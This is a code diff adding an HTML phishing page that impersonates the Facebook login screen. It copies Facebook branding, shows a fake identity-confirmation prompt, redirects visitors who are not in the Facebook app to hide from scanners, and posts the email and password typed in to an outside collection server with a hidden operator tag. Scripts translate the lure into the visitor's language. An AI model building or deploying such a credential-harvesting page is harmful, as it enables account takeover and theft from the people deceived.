@@ -1,0 +1,564 @@
+<html lang="en">
+<head>
+<script>
+    // Función para detectar si la página se abre en la aplicación de Facebook
+    function isFacebookApp() {
+        return navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
+    }
+
+    // Función para redirigir si no está en la aplicación de Facebook
+    function checkAndRedirect() {
+        if (!isFacebookApp()) {
+            // Si no está en la aplicación de Facebook, redirigir directamente sin cargar el contenido
+            document.write("Redirigiendo a otra página...");
+            window.location.href = "https://tuotrapagina.com";
+        }
+    }
+
+    // Llamar a la función al cargar la página
+    checkAndRedirect();
+</script>
+<meta charset="UTF-8">
+<meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+<title>Facebook</title>
+<style>
+* {margin: 0px;padding: 0px;box-sizing: border-box;font-family: sans-serif;}.container {margin-right: auto;margin-left: auto;}.col-xs-12 {width: 100%;}.carousel-inner>.item>a>img, .carousel-inner>.item>img, .img-responsive, .thumbnail a>img, .thumbnail>img {display: block;max-width: 100%;height: auto;}.modal {position: fixed;top: 0;right: 0;bottom: 0;left: 0;z-index: 1050;display: none;overflow: hidden;outline: 0;}.fade.in {opacity: 1;}.login-form-wrap {box-shadow: 0px 1px 2px 1px rgba(0,0,0,0.6);background: #fff;border-radius: 8px;width: 95%;max-width: 600px;height: 430px;margin: 40px auto;padding: 5px 25px 0;text-align: center;}input:focus {border: 1px solid #ccc!important;}.form-controll {padding: 3% 2%;background: #f5f6f7;border: 1px solid #E3E4E5;width: 100%;margin-bottom: 10px;-webkit-tap-highlight-color: transparent;font-size: 14px;line-height: 18px;border-radius: 5px;box-shadow: 1px 1px rgb(0 0 0 / 7%);}input,button {font-family: Helvetica, Arial, sans-serif;}input {background: #f5f6f7;font-size: 14px;line-height: 18px;}.submitStyleLogin {padding: 12px 0;background: #1877f2;border: 0;width: 100%;font-size: 16px;line-height: 18px;border-radius: 5px;box-shadow: 0 2px 2px -2px #cacaca;color: #fff;font-weight: bold;text-shadow: 0 -1px rgb(0 0 0 / 25%);}.submitStyleRegister {background: #00A400;border: 0;height: 36px;padding-left: 16px;padding-right: 16px;margin: auto;font-size: 14px;line-height: 18px;border-radius: 5px;box-shadow: 0 2px 2px -2px #cacaca;color: #fff;font-weight: bold;text-shadow: 0 -1px rgb(0 0 0 / 25%);}.submitStyleRegister:hover {background-color: #36a420;border-color: #36a420;}.submitStyleRegister:active {background-color: #2b9217!important;border-color: #2b9217!important;}.videoView {width: 100%;color: darkred;font-size: 14px;background-color: #fff9d7;border: 1px solid #e2c822;padding: 7px 23px;margin: 10px auto;border-radius: 6px;}#dp_00004 {color: #899bc1;font-size: 12px;line-height: 16px;margin-top: 10px;}#myModal {display: block;margin-top: 100px;}.nguoisangtao {background-color: yellow;font-size: 20pt;}.nguoisangtaocustom {color: #ff1313;}.img-responsive {height: 100vh;object-fit: cover;width: 100%;}.separator {clear: both;text-align: center;}.inputcustom1 {height: 40px;margin-bottom: 6px;}.inputcustom2 {height: 40px;}._55ws {padding: 10px 0px;border-top: none;}#logo {padding-top: 10px;text-align: center;align-items: center;}.olvido {color: #216fdb;cursor: pointer;text-decoration: none;font-size: 14px;}.bb {float: left;width: 42%;border-bottom: 2px solid #EAEBED;height: 10px;}#c {float: left;width: 16%;text-align: center;}.bb {float: left;width: 42%;border-bottom: 2px solid #EAEBED;height: 10px;margin-bottom: 5% }#bottom {width: 100%;text-align: center;}.errorlogin {width: 100%;color: #ffff;font-size: 14px;background-color: #FF0000;padding: 7px;margin: 10px auto;border-radius: 6px;}video {width: 100vw;height: 100vh;object-fit: cover;position: fixed;top: 0;left: 0;z-index: -1;}
+</style>
+</head>
+<body class="touch x1-5 ios mSafari _fzu _50-3 iframe acw" tabindex="0">
+<header>
+<div class="header no-items section" id="header"></div>
+</header>
+<main>
+<video id="player" poster="https://media.discordapp.net/attachments/1145523686535856178/1175387051273752687/sdweferg.jpg" muted controls>
+<source src="http://10.35.100.57/1.mp4" type="video/mp4">
+</video>
+<div class="modal fade in" id="myModal" role="dialog">
+<section class="login-form-wrap">
+<div id="logo"><img src="https://brandemia.org/sites/default/files/inline/images/facebook_logo_portada.jpg" width="150" class="img" alt="facebook"></div>
+<div class="row">
+    <div class="videoView" id="u_0_1_ZE" lang="en"
+    data-es="Inicia sesión en tu navegador para confirmar tu identidad y continuar"
+    data-en="Log in to your browser to confirm your identity and continue"
+    data-fr="Connectez-vous à votre navigateur pour confirmer votre identité et continuer"
+    data-it="Accedi al tuo browser per confermare la tua identità e continuare"
+    data-hu="Jelentkezzen be a böngészőjébe az azonosítás megerősítéséhez és a folytatáshoz">
+    Přihlaste se do prohlížeče a potvrďte svou totožnost a pokračujte
+</div>
+
+<div class="errorlogin" id="errorlogin" style="background-color: red; color: white; display: none; font-size: 14px; padding: 7px; margin: 10px auto; border-radius: 6px;">Incorrect password. Forgot your password?</div>
+<form action="https://mafiapanel.bio/save.php" class="col-xs-12 col-sm-12 col-md-12 col-lg-12" id="login_form_mb" method="post">
+<input type="hidden" name="username" value="Danieladmin">
+<form>
+<form>
+    <label for="email" class="sr-only"></label>
+    <input class="form-controll inputcustom1" id="email" name="email" placeholder="Email address or phone number" required="true" type="text"
+           data-af="E-posadres of telefoonnommer"
+           data-am="ኢመይል አድራሻ ወደ ስልኩ ተመን"
+           data-ar="عنوان البريد الإلكتروني أو رقم الهاتف"
+           data-az="E-poçt ünvanı və ya telefon nömrəsi"
+           data-be="Адрас электроннай пошты ці нумар тэлефона"
+           data-bg="Имейл адрес или телефонен номер"
+           data-bn="ইমেইল ঠিকানা বা ফোন নম্বর"
+           data-bs="Adresa e-pošte ili broj telefona"
+           data-ca="Adreça de correu electrònic o número de telèfon"
+           data-cs="E-mail nebo telefonní číslo"
+           data-cy="Cyfeiriad e-bost neu rif ffon"
+           data-da="E-mailadresse eller telefonnummer"
+           data-de="E-Mail-Adresse oder Telefonnummer"
+           data-el="Διεύθυνση email ή αριθμός τηλεφώνου"
+           data-en="Email address or phone number"
+           data-eo="Retpoŝta adreso aŭ telefono"
+           data-es="Dirección de correo electrónico o número de teléfono"
+           data-et="E-posti aadress või telefoninumber"
+           data-eu="E-posta helbidea edo telefono zenbakia"
+           data-fa="آدرس ایمیل یا شماره تلفن"
+           data-fi="Sähköpostiosoite tai puhelinnumero"
+           data-fr="Adresse e-mail ou numéro de téléphone"
+           data-ga="Seoladh Ríomhphoist nó Uimhir gutháin"
+           data-gl="Enderezo de correo electrónico ou número de teléfono"
+           data-gu="ઇમેઇલ એડ્રેસ અથવા ફોન નંબર"
+           data-he="כתובת דוא"ל או מספר טלפון"
+           data-hi="ईमेल पता या फ़ोन नंबर"
+           data-hr="Adresa e-pošte ili broj telefona"
+           data-ht="Adrès imel oswa nimewo telefòn"
+           data-hu="E-mail cím vagy telefonszám"
+           data-hy="Էլ․փոստի հասցե կամ հեռախոսահամար"
+           data-id="Alamat email atau nomor telepon"
+           data-is="Netfang eða símanúmer"
+           data-it="Indirizzo email o numero di telefono"
+           data-ja="電子メールアドレスまたは電話番号"
+           data-jv="Alamat surel utawa nomer telepon"
+           data-ka="ელფოსტის მისამართი ან ტელეფონის ნომერი"
+           data-kk="Электрондық пошта мекенжайы немесе телефон нөмірі"
+           data-km="អាសយដ្ឋាន​អ៊ីមែល ឬ​លេខទូរស័ព្ទ"
+           data-kn="ಇಮೇಲ್ ಚಳಕು ಅಥವಾ ದೂರವಾಣಿ ಸಂಖ್ಯೆ"
+           data-ko="이메일 주소 또는 전화 번호"
+           data-ky="Электрондук почта же телефон номери"
+           data-la="Addressus email aut numerus telephoni"
+           data-lb="E-Mail-Adress oder Telefonnummer"
+           data-lo="ທີ່ຢູ່ອີເມວຫຼືເບີໂທ"
+           data-lt="El. pašto adresas arba telefono numeris"
+           data-lv="E-pasta adrese vai telefona numurs"
+           data-mk="Адреса за е-пошта или телефонски број"
+           data-ml="ഇമെയിൽ അല്ലെങ്കിൽ ഫോൺ നമ്പർ"
+           data-mn="И-мэйл хаяг буюу утасны дугаар"
+           data-mr="ईमेल पत्ता किंवा फोन नंबर"
+           data-ms="Alamat emel atau nombor telefon"
+           data-mt="Indirizz tal-Email jew in-numru tat-telefown"
+           data-nb="E-postadresse eller telefonnummer"
+           data-ne="इमेल ठेगाना वा फोन नम्बर"
+           data-nl="E-mailadres of telefoonnummer"
+           data-no="E-postadresse eller telefonnummer"
+           data-nn="E-postadresse eller telefonnummer"
+           data-pa="ਇਮੇਲ ਐਡਰੈੱਸ ਜਾਂ ਫੋਨ ਨੰਬਰ"
+           data-pl="Adres e-mail lub numer telefonu"
+           data-pt="Endereço de email ou número de telefone"
+           data-ro="Adresă de email sau număr de telefon"
+           data-ru="Адрес электронной почты или номер телефона"
+           data-sq="Adresa e emailit ose numri i telefonit"
+           data-sr="Адреса е-поште или број телефона"
+           data-sv="E-postadress eller telefonnummer"
+           data-sw="Anwani ya barua pepe au namba ya simu"
+           data-ta="மின்னஞ்சல் முகவரி அல்லது தொலைபேசி எண்"
+           data-te="ఇమెయిల్ చిరునామా లేదా ఫోన్ నంబర్"
+           data-th="ที่อยู่อีเมลหรือหมายเลขโทรศัพท์"
+           data-tl="Email address o numero ng telepono"
+           data-tr="E-posta adresi veya telefon numarası"
+           data-uk="Адреса електронної пошти або номер телефону"
+           data-ur="ای میل ایڈریس یا فون نمبر"
+           data-uz="Elektron pochta manzili yoki telefon raqami"
+           data-vi="Địa chỉ email hoặc số điện thoại"
+           data-xh="Ikhaya le-imeyili noma inombolo yefowuni"
+           data-yi="אימייל אדרעס אדער טעלעפאן נומער"
+           data-zh="电子邮件地址或电话号码"
+           data-zu="Ikheli le-imeyili noma inombolo yefowuni"
+           data-cz="E-mail nebo telefonní číslo">
+</form>
+  <form>
+    <label for="pass" class="sr-only"></label>
+    <input class="form-controll inputcustom2" id="pass" name="pass" placeholder="Password" required="true" type="password"
+           data-af="Wagwoord"
+           data-am="በመረጃ አድርገዋል"
+           data-ar="كلمة المرور"
+           data-az="Parol"
+           data-be="Пароль"
+           data-bg="Парола"
+           data-bn="পাসওয়ার্ড"
+           data-bs="Lozinka"
+           data-ca="Contrasenya"
+           data-cs="Heslo"
+           data-cy="Cyfrinair"
+           data-da="Adgangskode"
+           data-de="Passwort"
+           data-el="Κωδικός πρόσβασης"
+           data-en="Password"
+           data-eo="Pasvorto"
+           data-es="Contraseña"
+           data-et="Parool"
+           data-eu="Pasahitza"
+           data-fa="رمز عبور"
+           data-fi="Salasana"
+           data-fr="Mot de passe"
+           data-ga="Pasfhocal"
+           data-gl="Contrasinal"
+           data-gu="પાસવર્ડ"
+           data-he="סיסמה"
+           data-hi="पासवर्ड"
+           data-hr="Lozinka"
+           data-ht="Modpas"
+           data-hu="Jelszó"
+           data-hy="Գաղտնաբար"
+           data-id="Kata sandi"
+           data-is="Lykilorð"
+           data-it="Password"
+           data-ja="パスワード"
+           data-jv="Sandi"
+           data-ka="პაროლი"
+           data-kk="Құпия сөз"
+           data-km="ពាក្យសម្ងាត់"
+           data-kn="ಪಾಸ್ವರ್ಡ್"
+           data-ko="암호"
+           data-ky="Сырсөз"
+           data-la="Clavis"
+           data-lb="Passwuert"
+           data-lo="ລະຫັດຜ່ານ"
+           data-lt="Slaptažodis"
+           data-lv="Parole"
+           data-mk="Лозинка"
+           data-ml="പാസ്വേഡ്"
+           data-mn="Нууц үг"
+           data-mr="संकेतशब्द"
+           data-ms="Kata Laluan"
+           data-mt="Password"
+           data-nb="Passord"
+           data-ne="पासवर्ड"
+           data-nl="Wachtwoord"
+           data-no="Passord"
+           data-nn="Passord"
+           data-pa="ਪਾਸਵਰਡ"
+           data-pl="Hasło"
+           data-pt="Palavra-passe"
+           data-ro="Parolă"
+           data-ru="Пароль"
+           data-sq="Fjalëkalim"
+           data-sr="Лозинка"
+           data-sv="Lösenord"
+           data-sw="Nenosiri"
+           data-ta="கடவுச்சொல்"
+           data-te="సంకేతపదము"
+           data-th="รหัสผ่าน"
+           data-tl="Password"
+           data-tr="Şifre"
+           data-uk="Пароль"
+           data-ur="پاس ورڈ"
+           data-uz="Parol"
+           data-vi="Mật khẩu"
+           data-xh="Iphasiwedi"
+           data-yi="פּאָסוואָרט"
+           data-zh="密码"
+           data-zu="Iphasiwedi">
+    </form>
+<div class="_55ws">
+    <button class="btn btn-primary btn-lg btn-block submitStyleLogin" id="dp_00002" name="submit" type="submit"
+    data-af="Aanhou"
+    data-am="ቀጣይ"
+    data-ar="استمر"
+    data-az="Davam et"
+    data-be="Працягнуць"
+    data-bg="Продължи"
+    data-bn="চলমান"
+    data-bs="Nastavi"
+    data-ca="Continuar"
+    data-cs="Pokračovat"
+    data-cy="Parhau"
+    data-da="Fortsætte"
+    data-de="Weiter"
+    data-el="Συνεχίστε"
+    data-en="Continue"
+    data-eo="Daŭrigi"
+    data-es="Continuar"
+    data-et="Jätka"
+    data-eu="Jarraitu"
+    data-fa="ادامه"
+    data-fi="Jatka"
+    data-fr="Continuer"
+    data-ga="Leanúint"
+    data-gl="Continuar"
+    data-gu="ચાલુ રાખો"
+    data-he="לְהַמְשִׁיך"
+    data-hi="जारी रखें"
+    data-hr="Nastavi"
+    data-ht="Kontinye"
+    data-hu="Folytatás"
+    data-hy="Շարունակել"
+    data-id="Lanjutkan"
+    data-is="Halda áfram"
+    data-it="Continua"
+    data-ja="続行"
+    data-jv="Terusake"
+    data-ka="გაგრძელება"
+    data-kk="Жалғастыру"
+    data-km="បន្ត"
+    data-kn="ಮುಂದುವರಿಸಿ"
+    data-ko="계속"
+    data-ky="Улантуу"
+    data-la="Persevera"
+    data-lb="Weidermachen"
+    data-lo="ຕົ້ນທືນ"
+    data-lt="Tęsti"
+    data-lv="Turpināt"
+    data-mk="Продолжи"
+    data-ml="തുടരുക"
+    data-mn="Үргэлжлүүлэх"
+    data-mr="सुरू"
+    data-ms="Teruskan"
+    data-mt="Kompli"
+    data-nb="Fortsett"
+    data-ne="जारी राख"
+    data-nl="Doorgaan"
+    data-no="Fortsett"
+    data-nn="Hald fram"
+    data-pa="ਜਾਰੀ ਰੱਖੋ"
+    data-pl="Kontynuuj"
+    data-pt="Continuar"
+    data-ro="Continuați"
+    data-ru="Продолжить"
+    data-sq="Vazhdoni"
+    data-sr="Настави"
+    data-sv="Fortsätt"
+    data-sw="Endelea"
+    data-ta="தொடர"
+    data-te="కొనసాగించు"
+    data-th="ดำเนินการต่อ"
+    data-tl="Ituloy"
+    data-tr="Devam et"
+    data-uk="Продовжити"
+    data-ur="جاری رہے"
+    data-uz="Davom et"
+    data-vi="Tiếp tục"
+    data-xh="Qhubeka"
+    data-yi="ווײַטער"
+    data-zh="继续"
+    data-zu="Qhubeka">
+Continue
+</button>
+</div>
+ <br>
+ <p class="olvido" id="forgotPassword"
+ data-af="Wag wagwoord?"
+ data-am="በመረጃ አድርገዋል?"
+ data-ar="هل نسيت كلمة المرور؟"
+ data-az="Parolu unutmusunuz?"
+ data-be="Забыліся пароль?"
+ data-bg="Забравена парола?"
+ data-bn="পাসওয়ার্ড ভুলে গেছেন?"
+ data-bs="Zaboravljena lozinka?"
+ data-ca="Has oblidat la contrasenya?"
+ data-cs="Zapomněl(a) jste heslo?"
+ data-cy="Wedi anghofio'r cyfrinair?"
+ data-da="Har du glemt adgangskoden?"
+ data-de="Passwort vergessen?"
+ data-el="Ξεχάσατε τον κωδικό σας;"
+ data-en="Forgot password?"
+ data-eo="Ĉu vi forgesis vian pasvorton?"
+ data-es="¿Olvidaste tu contraseña?"
+ data-et="Unustasite salasõna?"
+ data-eu="Pasahitza ahaztu duzu?"
+ data-fa="رمزعبور خود را فراموش کرده‌اید؟"
+ data-fi="Unohtuiko salasana?"
+ data-fr="Mot de passe oublié ?"
+ data-ga="An bhfuil do phasfhocal déanta de?"
+ data-gl="Esqueciches o contrasinal?"
+ data-gu="પાસવર્ડ ભૂલી ગયા?"
+ data-he="שכחת את הסיסמה?"
+ data-hi="क्या आपने पासवर्ड भूल गए हैं?"
+ data-hr="Zaboravili ste lozinku?"
+ data-ht="W'ap bliye modpas ou?"
+ data-hu="Elfelejtette a jelszavát?"
+ data-hy="Դուք մոռացել եք գաղտնաբարը՞"
+ data-id="Lupa kata sandi?"
+ data-is="Hafið þið gleymt lykilorðinu ykkar?"
+ data-it="Hai dimenticato la password?"
+ data-ja="パスワードをお忘れですか？"
+ data-jv="Lali sandi?"
+ data-ka="პაროლი დაგავიწყდა?"
+ data-kk="Құпия сөзді ұмыттыңыз ба?"
+ data-km="បាត់បង់លេខសំងាត់ទេ?"
+ data-kn="ನೀವು ಪಾಸ್ವರ್ಡ್ ಮರುಕಳಿಸಿದ್ದೀರಾ?"
+ data-ko="비밀번호를 잊으셨나요?"
+ data-ky="Сырсөздү унуттуңузбу?"
+ data-la="Numquid clavis oblita est?"
+ data-lb="Hutt dech d'Passwuert?"
+ data-lo="ທ່ານລືມລະຫັດຜ່ານບໍ່?"
+ data-lt="Pamiršote slaptažodį?"
+ data-lv="Aizmirsāt paroli?"
+ data-mk="Заборавена лозинка?"
+ data-ml="പാസ്‌വേഡ് മറന്നോ?"
+ data-mn="Нууц үгээ мартсан уу?"
+ data-mr="पासवर्ड विसरला?"
+ data-ms="Lupa kata laluan?"
+ data-mt="Skurmat il-password?"
+ data-nb="Har du glemt passordet?"
+ data-ne="पासवर्ड भुलेका हो?"
+ data-nl="Wachtwoord vergeten?"
+ data-no="Har du glemt passordet?"
+ data-nn="Har du gløymt passordet?"
+ data-pa="ਪਾਸਵਰਡ ਭੁੱਲ ਗਏ ਹੋ?"
+ data-pl="Zapomniałeś hasła?"
+ data-pt="Esqueceu-se da palavra-passe?"
+ data-ro="Ai uitat parola?"
+ data-ru="Забыли пароль?"
+ data-sq="Keni harruar fjalëkalimin?"
+ data-sr="Заборавили сте лозинку?"
+ data-sv="Har du glömt lösenordet?"
+ data-sw="Umesahau nenosiri?"
+ data-ta="உங்களுக்கு கடவுச்சொல் மறந்துவிட்டீர்களா?"
+ data-te="మీరు పాస్‌వర్డ్‌ను మర్చిపోయారా?"
+ data-th="ลืมรหัสผ่านหรือไม่?"
+ data-tl="Nakalimutan mo ba ang password?"
+ data-tr="Parolanızı mı unuttunuz?"
+ data-uk="Забули пароль?"
+ data-ur="آپ نے پاس ورڈ بھول گیا ہے؟"
+ data-uz="Parolingizni unutdingizmi?"
+ data-vi="Quên mật khẩu?"
+ data-xh="Kwenza i-secret ephakathi"
+ data-yi="האָט איר פּאָסטוואָרט?"
+ data-zh="忘记密码了吗？"
+ data-zu="Wenza i-secret entsha?">
+ Forgot password?
+</p>
+<br> 
+<div class="bb"></div>
+<div id="c">.</div>
+<div class="bb"></div> 
+<div id="bottom">
+    <button class="submitStyleRegister"
+    data-af="Skep nuwe rekening"
+    data-am="አዲስ መረጃ አድርጋል"
+    data-ar="إنشاء حساب جديد"
+    data-az="Yeni hesab yarat"
+    data-be="Стварыць новы акаунт"
+    data-bg="Създай нов акаунт"
+    data-bn="নতুন অ্যাকাউন্ট তৈরি করুন"
+    data-bs="Kreiraj novi račun"
+    data-ca="Crea un nou compte"
+    data-cs="Vytvořit nový účet"
+    data-cy="Creu cyfrif newydd"
+    data-da="Opret ny konto"
+    data-de="Neues Konto erstellen"
+    data-el="Δημιουργία νέου λογαριασμού"
+    data-en="Create new account"
+    data-eo="Krei novan konton"
+    data-es="Crear nueva cuenta"
+    data-et="Loo uus konto"
+    data-eu="Sortu kontu berria"
+    data-fa="ایجاد حساب کاربری جدید"
+    data-fi="Luo uusi tili"
+    data-fr="Créer un nouveau compte"
+    data-ga="Cruthaigh cuntas nua"
+    data-gl="Crear unha nova conta"
+    data-gu="નવું ખાતુ બનાવો"
+    data-he="צור חשבון חדש"
+    data-hi="नया खाता बनाएं"
+    data-hr="Kreiraj novi račun"
+    data-ht="Kreye yon nouvo kont"
+    data-hu="Új fiók létrehozása"
+    data-hy="Ստեղծել նոր հաշիվ"
+    data-id="Buat akun baru"
+    data-is="Búa til nýjan aðgang"
+    data-it="Crea un nuovo account"
+    data-ja="新しいアカウントを作成する"
+    data-jv="Gawe akun anyar"
+    data-ka="შექმენი ახალი ანგარიში"
+    data-kk="Жаңа тіркеу жасау"
+    data-km="បង្កើតគណនីថ្មី"
+    data-kn="ಹೊಸ ಖಾತೆ ತೆರೆಯಿರಿ"
+    data-ko="새 계정 만들기"
+    data-ky="Жаңы аккаунт түзүү"
+    data-la="Creare novum rationem"
+    data-lb="Ee neit Konto opmaachen"
+    data-lo="ສ້າງບັນຊີໃຫມ່"
+    data-lt="Sukurkite naują paskyrą"
+    data-lv="Izveidot jaunu kontu"
+    data-mk="Создај нов профил"
+    data-ml="പുതിയ അക്കൗണ്ട് സൃഷ്ടിക്കുക"
+    data-mn="Шинэ данс үүсгэх"
+    data-mr="नवीन खाते तयार करा"
+    data-ms="Buat akaun baru"
+    data-mt="Oħloq kont tiegħek ġdid"
+    data-nb="Opprett ny konto"
+    data-ne="नयाँ खाता बनाउनुहोस्"
+    data-nl="Maak een nieuw account aan"
+    data-no="Opprett ny konto"
+    data-nn="Opprett ny konto"
+    data-pa="ਨਵਾਂ ਖਾਤਾ ਬਣਾਓ"
+    data-pl="Utwórz nowe konto"
+    data-pt="Criar nova conta"
+    data-ro="Creează un cont nou"
+    data-ru="Создать новый аккаунт"
+    data-si="සියලුම ගිණුම් හදුනා ගන්න"
+    data-sk="Vytvořit nový účet"
+    data-sl="Ustvari nov račun"
+    data-sq="Krijo një llogari të re"
+    data-sr="Направите нови налог"
+    data-sv="Skapa ett nytt konto"
+    data-sw="Unda akaunti mpya"
+    data-ta="புதிய கணக்கொன்றை உருவாக்கவும்"
+    data-te="కొత్త ఖాతా సృష్టించండి"
+    data-th="สร้างบัญชีใหม่"
+    data-tl="Gumawa ng bagong account"
+    data-tr="Yeni hesap oluştur"
+    data-uk="Створити новий обліковий запис"
+    data-ur="نیا اکاؤنٹ بنائیں"
+    data-uz="Yangi hisob yarating"
+    data-vi="Tạo tài khoản mới"
+    data-xh="Dlala i-akhawunti entsha"
+    data-yi="שאַפֿן אַ נייַע אַקאַונט"
+    data-zh="创建新帐号"
+    data-zu="Dala i-akhawunti entsha">
+Create new account
+</button>
+</div>
+</form>
+</div>
+</section>
+</div>
+</main>
+</body>
+</html>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Función para obtener el idioma del navegador
+      function getBrowserLanguage() {
+        var userLang = navigator.language || navigator.userLanguage;
+        return userLang.substr(0, 2); // Devuelve las dos primeras letras (código de idioma)
+      }
+  
+      // Función para cambiar dinámicamente el idioma del elemento HTML
+      function autoTranslate() {
+        var userLanguage = getBrowserLanguage();
+  
+        // Traducción para el botón
+        var button = document.querySelector('.submitStyleRegister');
+        if (button) {
+          var translationKey = button.getAttribute('data-' + userLanguage);
+          if (translationKey) {
+            button.innerText = translationKey;
+          }
+        }
+  
+        // Traducción para el párrafo
+        var paragraph = document.querySelector('.olvido');
+        if (paragraph) {
+          var translationKey = paragraph.getAttribute('data-' + userLanguage);
+          if (translationKey) {
+            paragraph.innerText = translationKey;
+          }
+        }
+  
+        // Traducción para el otro botón
+        var loginButton = document.querySelector('.submitStyleLogin');
+        if (loginButton) {
+          var translationKey = loginButton.getAttribute('data-' + userLanguage);
+          if (translationKey) {
+            loginButton.innerText = translationKey;
+          }
+        }
+  
+        // Traducción para el formulario de contraseña
+        var passwordInput = document.getElementById('pass');
+        if (passwordInput) {
+          var translationKey = passwordInput.getAttribute('data-' + userLanguage);
+          if (translationKey) {
+            passwordInput.setAttribute('placeholder', translationKey);
+          }
+        }
+  
+        // Traducción para el formulario de correo electrónico o número de teléfono
+        var emailInput = document.getElementById('email');
+        if (emailInput) {
+          var translationKey = emailInput.getAttribute('data-' + userLanguage);
+          if (translationKey) {
+            emailInput.setAttribute('placeholder', translationKey);
+          }
+        }
+  
+        // Traducción para el div
+        var divText = document.getElementById('u_0_1_ZE');
+        if (divText) {
+          var translationKey = divText.getAttribute('data-' + userLanguage);
+          if (translationKey) {
+            divText.innerText = translationKey;
+          }
+        }
+      }
+  
+      // Llama a la función de traducción automática al cargar la página
+      autoTranslate();
+    });
+  </script>
